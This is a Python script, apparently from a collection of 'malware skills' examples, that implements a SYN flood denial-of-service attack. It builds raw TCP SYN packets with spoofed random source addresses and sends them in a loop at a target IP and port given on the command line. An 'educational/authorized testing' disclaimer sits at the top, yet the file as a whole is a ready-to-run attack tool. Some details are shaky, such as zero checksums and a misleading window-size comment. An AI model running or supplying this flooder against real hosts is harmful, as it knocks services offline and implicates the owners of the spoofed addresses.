# Network Attack Example - SYN Flood
# Based on network-attacks.md from malware skills

# This script demonstrates a basic SYN flood attack
# For educational/authorized testing purposes only

import socket
import random
import time
import sys

def syn_flood(target_ip, target_port, duration=60):
    """
    Perform a SYN flood attack on target IP:port

    Args:
        target_ip (str): Target IP address
        target_port (int): Target port
        duration (int): Attack duration in seconds
    """
    print(f"[+] Starting SYN flood on {target_ip}:{target_port} for {duration} seconds")

    # Create raw socket (requires root/admin privileges)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("[-] Error: Raw socket creation requires administrator/root privileges")
        return False
    except Exception as e:
        print(f"[-] Error creating socket: {e}")
        return False

    end_time = time.time() + duration
    packet_count = 0

    try:
        while time.time() < end_time:
            # Generate random source IP and port
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            src_port = random.randint(1024, 65535)

            # Build IP header
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 40  # IP header (20) + TCP header (20)
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0  # Kernel will fill this
            ip_saddr = socket.inet_aton(src_ip)
            ip_daddr = socket.inet_aton(target_ip)

            ip_ihl_ver = (ip_ver << 4) + ip_ihl

            # Build TCP header
            tcp_source = src_port
            tcp_dest = target_port
            tcp_seq = random.randint(0, 4294967295)
            tcp_ack_seq = 0
            tcp_doff = 5  # Data offset
            tcp_fin = 0
            tcp_syn = 1   # SYN flag set
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 0
            tcp_urg = 0
            tcp_window = socket.htons(5840)  # Maximum window size
            tcp_check = 0  # Kernel will fill this
            tcp_urg_ptr = 0

            tcp_offset_res = (tcp_doff << 4) + 0
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

            # Build packet (without checksums for simplicity)
            # In real implementation, you'd need to calculate proper checksums
            packet = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr) + \
                       struct.pack('!HHLLBBHHH',
                                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

            # Send packet
            sock.sendto(packet, (target_ip, 0))
            packet_count += 1

            # Small delay to prevent overwhelming local system
            if packet_count % 1000 == 0:
                time.sleep(0.01)

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"[-] Error during attack: {e}")
    finally:
        sock.close()

    print(f"[+] SYN flood completed. Sent {packet_count} packets.")
    return True

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python network_attack_example.py <target_ip> <target_port> [duration]")
        print("Example: python network_attack_example.py 192.168.1.100 80 60")
        sys.exit(1)

    target_ip = sys.argv[1]
    try:
        target_port = int(sys.argv[2])
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
    except ValueError:
        print("[-] Error: Port and duration must be integers")
        sys.exit(1)

    # Import struct here to avoid issues if not used
    import struct

    syn_flood(target_ip, target_port, duration)